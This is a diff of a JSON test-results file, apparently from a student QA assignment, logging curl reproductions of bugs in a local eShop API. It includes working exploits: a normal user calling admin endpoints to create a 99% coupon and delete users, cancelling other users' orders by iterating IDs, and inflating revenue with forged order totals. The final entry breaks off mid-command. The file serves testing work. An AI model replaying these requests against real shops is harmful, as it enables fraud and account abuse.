@@ -1,7 +1,7 @@
 {
   "host": "qt-ThinkBook-14-G5-IRH",
   "user": "qt",
-  "at": "2026-08-19T04:51:42.559Z",
+  "at": "2026-08-19T06:02:29.504Z",
   "results": [
     {
       "id": "BUG-A1-01",
@@ -25,7 +25,7 @@
       "parts": [
         {
           "cmd": "./scripts/reset-db.sh >/dev/null 2>&1; AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token)\nfor i in 1 2 3; do\n  printf 'lan %s -> HTTP ' \"$i\"\n  curl -s -o /dev/null -w '%{http_code}   ' -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"SAI\"}'\n  curl -s localhost:3000/api/admin/users -H \"Authorization: Bearer $AT\" | jq -c '.[] | select(.email==\"test@eshop.com\") | {login_attempts, locked_until}'\ndone",
-          "out": "lan 1 -> HTTP 401   {\"login_attempts\":2,\"locked_until\":null}\nlan 2 -> HTTP 401   {\"login_attempts\":4,\"locked_until\":\"2026-08-19T04:51:18.939Z\"}\nlan 3 -> HTTP 403   {\"login_attempts\":4,\"locked_until\":\"2026-08-19T04:51:18.939Z\"}\n"
+          "out": "lan 1 -> HTTP 401   {\"login_attempts\":2,\"locked_until\":null}\nlan 2 -> HTTP 401   {\"login_attempts\":4,\"locked_until\":\"2026-08-19T06:01:55.268Z\"}\nlan 3 -> HTTP 403   {\"login_attempts\":4,\"locked_until\":\"2026-08-19T06:01:55.268Z\"}\n"
         }
       ]
     },
@@ -38,7 +38,7 @@
       "parts": [
         {
           "cmd": "AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token); curl -s localhost:3000/api/admin/users -H \"Authorization: Bearer $AT\" | jq -r '.[] | select(.email==\"test@eshop.com\") | .locked_until' | xargs -I{} node -e \"console.log('locked_until =', '{}'); console.log('con lai   =', Math.round((new Date('{}')-Date.now())/1000), 'giay  (dac ta doi TONG 30 giay)')\"",
-          "out": "locked_until = 2026-08-19T04:51:18.939Z\ncon lai   = 180 giay  (dac ta doi TONG 30 giay)\n"
+          "out": "locked_until = 2026-08-19T06:01:55.268Z\ncon lai   = 180 giay  (dac ta doi TONG 30 giay)\n"
         }
       ]
     },
@@ -52,7 +52,7 @@
       "parts": [
         {
           "cmd": "./scripts/reset-db.sh >/dev/null 2>&1; curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token | cut -d. -f2 | base64 -d 2>/dev/null; echo; echo '^ khong co claim exp'",
-          "out": "{\"id\":2,\"role\":\"user\",\"iat\":1787114900}\n^ khong co claim exp\n"
+          "out": "{\"id\":2,\"role\":\"user\",\"iat\":1787119136}\n^ khong co claim exp\n"
         },
         {
           "cmd": "echo 'SECRET_KEY hardcode ngay trong ma nguon:'; sed -n '9p' sut/backend/server.js",
@@ -126,7 +126,7 @@
       "parts": [
         {
           "cmd": "S=$(date +%s%N); for i in $(seq 1 100); do curl -s -o /dev/null -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"ma@hw06.local\",\"password\":\"SAI\"}'; done; E=$(date +%s%N); echo \"100 request hoan tat trong $(( (E-S)/1000000 )) ms, khong request nao bi chan\"",
-          "out": "100 request hoan tat trong 542 ms, khong request nao bi chan\n"
+          "out": "100 request hoan tat trong 690 ms, khong request nao bi chan\n"
         }
       ]
     },
@@ -152,7 +152,7 @@
       "parts": [
         {
           "cmd": "./scripts/reset-db.sh >/dev/null 2>&1; AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token)\nctr(){ curl -s localhost:3000/api/admin/users -H \"Authorization: Bearer $AT\" | jq -c '.[] | select(.email==\"test@eshop.com\") | {login_attempts, locked_until}'; }\nbad(){ curl -s -o /dev/null -w '%{http_code}' -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"SAI\"}'; }\necho \"T+0     sai 1 -> $(bad)   $(ctr)\"\necho \"        sai 2 -> $(bad)   $(ctr)   [da khoa]\"\necho '        ... cho 185 giay cho het han khoa ...'\nsleep 185\necho \"T+185   $(ctr)   <- bo dem KHONG duoc reset\"\necho \"        sai them DUNG 1 lan -> $(bad)   $(ctr)   [khoa lai them 180s]\"\nprintf '        thu mat khau DUNG -> HTTP '; curl -s -o /dev/null -w '%{http_code}\\n' -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}'",
-          "out": "T+0     sai 1 -> 401   {\"login_attempts\":2,\"locked_until\":null}\n        sai 2 -> 401   {\"login_attempts\":4,\"locked_until\":\"2026-08-19T04:51:27.649Z\"}   [da khoa]\n        ... cho 185 giay cho het han khoa ...\nT+185   {\"login_attempts\":4,\"locked_until\":\"2026-08-19T04:51:27.649Z\"}   <- bo dem KHONG duoc reset\n        sai them DUNG 1 lan -> 401   {\"login_attempts\":6,\"locked_until\":\"2026-08-19T04:54:32.677Z\"}   [khoa lai them 180s]\n        thu mat khau DUNG -> HTTP 403\n"
+          "out": "T+0     sai 1 -> 401   {\"login_attempts\":2,\"locked_until\":null}\n        sai 2 -> 401   {\"login_attempts\":4,\"locked_until\":\"2026-08-19T06:02:04.230Z\"}   [da khoa]\n        ... cho 185 giay cho het han khoa ...\nT+185   {\"login_attempts\":4,\"locked_until\":\"2026-08-19T06:02:04.230Z\"}   <- bo dem KHONG duoc reset\n        sai them DUNG 1 lan -> 401   {\"login_attempts\":6,\"locked_until\":\"2026-08-19T06:05:09.258Z\"}   [khoa lai them 180s]\n        thu mat khau DUNG -> HTTP 403\n"
         }
       ]
     },
@@ -256,7 +256,7 @@
       "parts": [
         {
           "cmd": "AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token)\necho 'don hang tro toi nguoi dung khong con ton tai (user_name = null):'\ncurl -s localhost:3000/api/admin/orders -H \"Authorization: Bearer $AT\" | jq -c '.[] | select(.user_name==null)'",
-          "out": "don hang tro toi nguoi dung khong con ton tai (user_name = null):\n{\"id\":1,\"user_id\":3,\"total_amount\":9999,\"status\":\"pending\",\"shipping_address\":\"nowhere\",\"created_at\":\"2026-08-19 04:51:40\",\"user_name\":null}\n"
+          "out": "don hang tro toi nguoi dung khong con ton tai (user_name = null):\n{\"id\":1,\"user_id\":3,\"total_amount\":9999,\"status\":\"pending\",\"shipping_address\":\"nowhere\",\"created_at\":\"2026-08-19 06:02:17\",\"user_name\":null}\n"
         }
       ]
     },
@@ -270,6 +270,84 @@
         {
           "cmd": "./scripts/reset-db.sh >/dev/null 2>&1\nT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token)\necho 'da lay token. Gio co tinh sai mat khau cho toi khi tai khoan bi khoa:'\nfor i in 1 2; do curl -s -o /dev/null -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"SAI\"}'; done\ncurl -s -o /dev/null -w '  dang nhap lai          -> HTTP %{http_code}\\n' -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}'\ncurl -s -o /dev/null -w '  dat hang bang token cu -> HTTP %{http_code}\\n' -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' -d '{\"total_amount\":1,\"shipping_address\":\"x\"}'",
           "out": "da lay token. Gio co tinh sai mat khau cho toi khi tai khoan bi khoa:\n  dang nhap lai          -> HTTP 403\n  dat hang bang token cu -> HTTP 200\n"
+        }
+      ]
+    },
+    {
+      "id": "BUG-A3-01",
+      "title": "Không kiểm role — user thường đổi được trạng thái mọi đơn hàng (FR-12, SEC-03)",
+      "cmds": [
+        "./scripts/reset-db.sh >/dev/null 2>&1; UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token); OID=$(curl -s -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":1000,\"shipping_address\":\"x\"}' | jq -r .orderId)\necho \"don $OID, dung TOKEN USER THUONG goi API admin:\"\nfor s in confirmed shipping delivered; do\n  printf '  user doi -> %-10s HTTP ' \"$s\"\n  curl -s -o /dev/null -w '%{http_code}  ' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d \"{\\\"status\\\":\\\"$s\\\"}\"\n  echo \"trang thai: $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\ndone\necho\necho 'Diem tot: chu ky JWT VAN duoc kiem dung -'\nFAKE=$(node -e \"const t=process.argv[1].split('.');const p=JSON.parse(Buffer.from(t[1],'base64url').toString());p.role='admin';console.log(t[0]+'.'+Buffer.from(JSON.stringify(p)).toString('base64url')+'.'+t[2]);\" \"$UT\")\ncurl -s -o /dev/null -w '  token sua role ma khong ky lai -> HTTP %{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $FAKE\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}'"
+      ],
+      "parts": [
+        {
+          "cmd": "./scripts/reset-db.sh >/dev/null 2>&1; UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token); OID=$(curl -s -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":1000,\"shipping_address\":\"x\"}' | jq -r .orderId)\necho \"don $OID, dung TOKEN USER THUONG goi API admin:\"\nfor s in confirmed shipping delivered; do\n  printf '  user doi -> %-10s HTTP ' \"$s\"\n  curl -s -o /dev/null -w '%{http_code}  ' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d \"{\\\"status\\\":\\\"$s\\\"}\"\n  echo \"trang thai: $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\ndone\necho\necho 'Diem tot: chu ky JWT VAN duoc kiem dung -'\nFAKE=$(node -e \"const t=process.argv[1].split('.');const p=JSON.parse(Buffer.from(t[1],'base64url').toString());p.role='admin';console.log(t[0]+'.'+Buffer.from(JSON.stringify(p)).toString('base64url')+'.'+t[2]);\" \"$UT\")\ncurl -s -o /dev/null -w '  token sua role ma khong ky lai -> HTTP %{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $FAKE\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}'",
+          "out": "don 1, dung TOKEN USER THUONG goi API admin:\n  user doi -> confirmed  HTTP 200  trang thai: confirmed\n  user doi -> shipping   HTTP 200  trang thai: shipping\n  user doi -> delivered  HTTP 200  trang thai: delivered\n\nDiem tot: chu ky JWT VAN duoc kiem dung -\n  token sua role ma khong ky lai -> HTTP 403\n"
+        }
+      ]
+    },
+    {
+      "id": "BUG-A3-02",
+      "title": "canceled → delivered được chấp nhận, phá vỡ trạng thái kết thúc (FR-10)",
+      "cmds": [
+        "./scripts/reset-db.sh >/dev/null 2>&1; AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token); UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token)\nOID=$(curl -s -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":9000000,\"shipping_address\":\"x\"}' | jq -r .orderId)\ncurl -s -o /dev/null -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $AT\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}'\necho \"sau khi huy      : $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\ncurl -s -o /dev/null -w 'doi sang delivered -> HTTP %{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $AT\" -H 'Content-Type: application/json' -d '{\"status\":\"delivered\"}'\necho \"trang thai cuoi  : $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\necho\necho 'FR-10: \"delivered va canceled la trang thai KET THUC - khong duoc chuyen di dau nua\"'"
+      ],
+      "parts": [
+        {
+          "cmd": "./scripts/reset-db.sh >/dev/null 2>&1; AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token); UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token)\nOID=$(curl -s -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":9000000,\"shipping_address\":\"x\"}' | jq -r .orderId)\ncurl -s -o /dev/null -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $AT\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}'\necho \"sau khi huy      : $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\ncurl -s -o /dev/null -w 'doi sang delivered -> HTTP %{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $AT\" -H 'Content-Type: application/json' -d '{\"status\":\"delivered\"}'\necho \"trang thai cuoi  : $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\necho\necho 'FR-10: \"delivered va canceled la trang thai KET THUC - khong duoc chuyen di dau nua\"'",
+          "out": "sau khi huy      : canceled\ndoi sang delivered -> HTTP 200\ntrang thai cuoi  : delivered\n\nFR-10: \"delivered va canceled la trang thai KET THUC - khong duoc chuyen di dau nua\"\n"
+        }
+      ]
+    },
+    {
+      "id": "BUG-A3-03",
+      "title": "Hai chuyển đổi mâu thuẫn đồng thời cùng trả 200",
+      "cmds": [
+        "./scripts/reset-db.sh >/dev/null 2>&1; AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token); UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token)\nfor run in 1 2 3; do\n  OID=$(curl -s -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":1,\"shipping_address\":\"z\"}' | jq -r .orderId)\n  A=$(mktemp); C=$(mktemp)\n  curl -s -o /dev/null -w '%{http_code}' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $AT\" -H 'Content-Type: application/json' -d '{\"status\":\"confirmed\"}' > $A &\n  curl -s -o /dev/null -w '%{http_code}' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $AT\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}' > $C &\n  wait\n  echo \"  luot $run: confirmed->$(cat $A) | canceled->$(cat $C) | trang thai cuoi: $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\n  rm -f $A $C\ndone\necho\necho '(ca hai deu bao thanh cong, nhung chi mot cai co hieu luc - va ket qua KHONG tat dinh)'"
+      ],
+      "parts": [
+        {
+          "cmd": "./scripts/reset-db.sh >/dev/null 2>&1; AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token); UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token)\nfor run in 1 2 3; do\n  OID=$(curl -s -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":1,\"shipping_address\":\"z\"}' | jq -r .orderId)\n  A=$(mktemp); C=$(mktemp)\n  curl -s -o /dev/null -w '%{http_code}' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $AT\" -H 'Content-Type: application/json' -d '{\"status\":\"confirmed\"}' > $A &\n  curl -s -o /dev/null -w '%{http_code}' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $AT\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}' > $C &\n  wait\n  echo \"  luot $run: confirmed->$(cat $A) | canceled->$(cat $C) | trang thai cuoi: $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\n  rm -f $A $C\ndone\necho\necho '(ca hai deu bao thanh cong, nhung chi mot cai co hieu luc - va ket qua KHONG tat dinh)'",
+          "out": "  luot 1: confirmed->200 | canceled->200 | trang thai cuoi: confirmed\n  luot 2: confirmed->200 | canceled->200 | trang thai cuoi: confirmed\n  luot 3: confirmed->200 | canceled->200 | trang thai cuoi: confirmed\n\n(ca hai deu bao thanh cong, nhung chi mot cai co hieu luc - va ket qua KHONG tat dinh)\n"
+        }
+      ]
+    },
+    {
+      "id": "BUG-A3-04",
+      "title": "Toàn bộ /api/admin/* thiếu kiểm role — chiếm quyền quản trị bằng tài khoản khách",
+      "cmds": [
+        "./scripts/reset-db.sh >/dev/null 2>&1; UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token)\nH=(-H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json')\necho 'Goi bang TOKEN USER THUONG:'\ncurl -s -o /dev/null -w '  GET    /api/admin/users           -> %{http_code}\\n' localhost:3000/api/admin/users \"${H[@]}\"\ncurl -s -o /dev/null -w '  GET    /api/admin/orders          -> %{http_code}\\n' localhost:3000/api/admin/orders \"${H[@]}\"\ncurl -s -o /dev/null -w '  POST   /api/admin/coupons         -> %{http_code}\\n' -X POST localhost:3000/api/admin/coupons \"${H[@]}\" -d '{\"code\":\"HACK\",\"type\":\"percent\",\"discount_value\":99,\"min_order_amount\":0,\"expired_at\":\"2099-01-01\",\"max_uses_per_user\":99}'\ncurl -s -o /dev/null -w '  POST   /api/admin/import-products -> %{http_code}\\n' -X POST localhost:3000/api/admin/import-products \"${H[@]}\" -d '{\"products\":[{\"name\":\"X\",\"price\":1,\"description\":\"\",\"imageUrl\":\"\",\"category_id\":1}]}'\ncurl -s -o /dev/null -w '  DELETE /api/admin/users/9999      -> %{http_code}\\n' -X DELETE localhost:3000/api/admin/users/9999 \"${H[@]}\"\necho\necho 'Va thao tac THAT SU co hieu luc:'\necho '  bang nguoi dung doc duoc:'\ncurl -s localhost:3000/api/admin/users \"${H[@]}\" | jq -c '.[0:2]'\necho '  ma giam gia 99% do user thuong tu tao:'\ncurl -s localhost:3000/api/coupons \"${H[@]}\" | jq -c '.[] | select(.code==\"HACK\")'"
+      ],
+      "parts": [
+        {
+          "cmd": "./scripts/reset-db.sh >/dev/null 2>&1; UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token)\nH=(-H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json')\necho 'Goi bang TOKEN USER THUONG:'\ncurl -s -o /dev/null -w '  GET    /api/admin/users           -> %{http_code}\\n' localhost:3000/api/admin/users \"${H[@]}\"\ncurl -s -o /dev/null -w '  GET    /api/admin/orders          -> %{http_code}\\n' localhost:3000/api/admin/orders \"${H[@]}\"\ncurl -s -o /dev/null -w '  POST   /api/admin/coupons         -> %{http_code}\\n' -X POST localhost:3000/api/admin/coupons \"${H[@]}\" -d '{\"code\":\"HACK\",\"type\":\"percent\",\"discount_value\":99,\"min_order_amount\":0,\"expired_at\":\"2099-01-01\",\"max_uses_per_user\":99}'\ncurl -s -o /dev/null -w '  POST   /api/admin/import-products -> %{http_code}\\n' -X POST localhost:3000/api/admin/import-products \"${H[@]}\" -d '{\"products\":[{\"name\":\"X\",\"price\":1,\"description\":\"\",\"imageUrl\":\"\",\"category_id\":1}]}'\ncurl -s -o /dev/null -w '  DELETE /api/admin/users/9999      -> %{http_code}\\n' -X DELETE localhost:3000/api/admin/users/9999 \"${H[@]}\"\necho\necho 'Va thao tac THAT SU co hieu luc:'\necho '  bang nguoi dung doc duoc:'\ncurl -s localhost:3000/api/admin/users \"${H[@]}\" | jq -c '.[0:2]'\necho '  ma giam gia 99% do user thuong tu tao:'\ncurl -s localhost:3000/api/coupons \"${H[@]}\" | jq -c '.[] | select(.code==\"HACK\")'",
+          "out": "Goi bang TOKEN USER THUONG:\n  GET    /api/admin/users           -> 200\n  GET    /api/admin/orders          -> 200\n  POST   /api/admin/coupons         -> 200\n  POST   /api/admin/import-products -> 200\n  DELETE /api/admin/users/9999      -> 200\n\nVa thao tac THAT SU co hieu luc:\n  bang nguoi dung doc duoc:\n[{\"id\":1,\"name\":\"Admin User\",\"email\":\"admin@eshop.com\",\"role\":\"admin\",\"login_attempts\":0,\"locked_until\":null,\"shipping_address\":null},{\"id\":2,\"name\":\"Test User\",\"email\":\"test@eshop.com\",\"role\":\"user\",\"login_attempts\":0,\"locked_until\":null,\"shipping_address\":null}]\n  ma giam gia 99% do user thuong tu tao:\n{\"id\":5,\"code\":\"HACK\",\"type\":\"percent\",\"discount_value\":99,\"min_order_amount\":0,\"expired_at\":\"2099-01-01\",\"is_active\":1,\"max_uses_per_user\":99}\n"
+        }
+      ]
+    },
+    {
+      "id": "BUG-A3-05",
+      "title": "Người dùng lạ hủy được đơn hàng của người khác",
+      "cmds": [
+        "./scripts/reset-db.sh >/dev/null 2>&1; UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token); OID=$(curl -s -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":1000,\"shipping_address\":\"x\"}' | jq -r .orderId)\necho \"don $OID thuoc user id $(curl -s localhost:3000/api/orders/$OID | jq -r .user_id)\"\ncurl -s -o /dev/null -X POST localhost:3000/api/register -H 'Content-Type: application/json' -d '{\"name\":\"Ke La\",\"email\":\"kela@hw06.local\",\"password\":\"Test1234!\"}'\nXT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"kela@hw06.local\",\"password\":\"Test1234!\"}' | jq -r .token)\necho 'nguoi HOAN TOAN XA LA huy don do:'\ncurl -s -o /dev/null -w '  -> HTTP %{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $XT\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}'\necho \"  trang thai don: $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\necho\necho 'va vi id don la so nguyen tang dan, duyet 1..N la huy sach ca he thong:'\nfor i in 1 2 3; do\n  curl -s -o /dev/null -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":1000,\"shipping_address\":\"x\"}'\ndone\nfor i in 1 2 3; do printf '  huy don %s -> HTTP ' \"$i\"; curl -s -o /dev/null -w '%{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$i/status -H \"Authorization: Bearer $XT\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}'; done"
+      ],
+      "parts": [
+        {
+          "cmd": "./scripts/reset-db.sh >/dev/null 2>&1; UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token); OID=$(curl -s -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":1000,\"shipping_address\":\"x\"}' | jq -r .orderId)\necho \"don $OID thuoc user id $(curl -s localhost:3000/api/orders/$OID | jq -r .user_id)\"\ncurl -s -o /dev/null -X POST localhost:3000/api/register -H 'Content-Type: application/json' -d '{\"name\":\"Ke La\",\"email\":\"kela@hw06.local\",\"password\":\"Test1234!\"}'\nXT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"kela@hw06.local\",\"password\":\"Test1234!\"}' | jq -r .token)\necho 'nguoi HOAN TOAN XA LA huy don do:'\ncurl -s -o /dev/null -w '  -> HTTP %{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$OID/status -H \"Authorization: Bearer $XT\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}'\necho \"  trang thai don: $(curl -s localhost:3000/api/orders/$OID | jq -r .status)\"\necho\necho 'va vi id don la so nguyen tang dan, duyet 1..N la huy sach ca he thong:'\nfor i in 1 2 3; do\n  curl -s -o /dev/null -X POST localhost:3000/api/checkout -H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json' -d '{\"total_amount\":1000,\"shipping_address\":\"x\"}'\ndone\nfor i in 1 2 3; do printf '  huy don %s -> HTTP ' \"$i\"; curl -s -o /dev/null -w '%{http_code}\\n' -X PUT localhost:3000/api/admin/orders/$i/status -H \"Authorization: Bearer $XT\" -H 'Content-Type: application/json' -d '{\"status\":\"canceled\"}'; done",
+          "out": "don 1 thuoc user id 2\nnguoi HOAN TOAN XA LA huy don do:\n  -> HTTP 200\n  trang thai don: canceled\n\nva vi id don la so nguyen tang dan, duyet 1..N la huy sach ca he thong:\n  huy don 1 -> HTTP 400\n  huy don 2 -> HTTP 200\n  huy don 3 -> HTTP 200\n"
+        }
+      ]
+    },
+    {
+      "id": "BUG-A3-06",
+      "title": "Ghép BUG-A2-01 + BUG-A3-01: khách tự ghi doanh thu vào dashboard",
+      "cmds": [
+        "./scripts/reset-db.sh >/dev/null 2>&1; AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token); UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token)\nH=(-H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json')\necho 'Chuoi khai thac chi dung MOT tai khoan khach binh thuong:'\nO=$(curl -s -X POST localhost:3000/api/checkout \"${H[@]}\" -d '{\"total_amount\":999999999999,\"shipping_address\":\"x\"}' | jq -r .orderId)\necho \"  1. tu khai don tri gia 999.999.999.999 (BUG-A2-01) -> don $O\"\nfor s in confirmed shipping delivered; do curl -s -o /dev/null -X PUT localhost:3000/api/admin/orders/$O/status \"${H[@]}\" -d \"{\\\"status\\\":\\\"$s\\\"}\"; done\necho \"  2. tu day don sang delivered (BUG-A3-01) -> $(curl -s localhost:3000/api/orders/$O | jq -r .status)\"\nprintf '  3. FR-13 doanh thu = tong total_amount cac don delivered = '\ncurl -s localhost:3000/api/admin/orders -H \"Authorization: Bearer $AT\" | jq '[.[] | select(.status==\"delivered\") | .total_amount] | add'\necho\necho '  ... va so am cung duoc:'\nO2=$(curl -s -X POST localhost:3000/api/checkout \"${H[@]}\" -d '{\"total_amount\":-999999999999,\"shipping_address\":\"x\"}' | jq -r .orderId)\nfor s in confirmed shipping delivered; do curl -s -o /dev/null -X PUT localhost:3000/api/admin/orders/$O2/status \"${H[@]}\" -d \"{\\\"status\\\":\\\"$s\\\"}\"; done\nprintf '     doanh thu sau do = '\ncurl -s localhost:3000/api/admin/orders -H \"Authorization: Bearer $AT\" | jq '[.[] | select(.status==\"delivered\") | .total_amount] | add'"
+      ],
+      "parts": [
+        {
+          "cmd": "./scripts/reset-db.sh >/dev/null 2>&1; AT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@eshop.com\",\"password\":\"Admin123!\"}' | jq -r .token); UT=$(curl -s -X POST localhost:3000/api/login -H 'Content-Type: application/json' -d '{\"email\":\"test@eshop.com\",\"password\":\"Test1234!\"}' | jq -r .token)\nH=(-H \"Authorization: Bearer $UT\" -H 'Content-Type: application/json')\necho 'Chuoi khai thac chi dung MOT tai khoan khach binh thuong:'\nO=$(curl -s -X POST localhost:3000/api/checkout \"${H[@]}\" -d '{\"total_amount\":999999999999,\"shipping_address\":\"x\"}' | jq -r .orderId)\necho \"  1. tu khai don tri gia 999.999.999.999 (BUG-A2-01) -> don $O\"\nfor s in confirmed shipping delivered; do curl -s -o /dev/null -X PUT localhost:3000/api/admin/orders/$O/status \"${H[@]}\" -d \"{\\\"status\\\":\\\"$s\\\"}\"; done\necho \"  2. tu day don sang delivered (BUG-A3-01) -> $(curl -s localhost:3000/api/orders/$O | jq -r .status)\"\nprintf '  3. FR-13 doanh thu = tong total_amount cac don delivered = '\ncurl -s localhost:3000/api/admin/orders -H \"Authorization: Bearer $AT\" | jq '[.[] | select(.status==\"delivered\") | .total_amount] | add'\necho\necho '  ... va so am cung duoc:'\nO2=$(curl -s -X POST localhost:3000/api/checkout \"${H[@]}\" -d '{\"total_amount\":-999999999999,\"shipping_address\":\"x\"}' | jq -r .orderId)\nfor s in confirmed shipping delivered; do curl -s -o /dev/null -X PUT localhost:3000/api/admin/orders/$O2/status 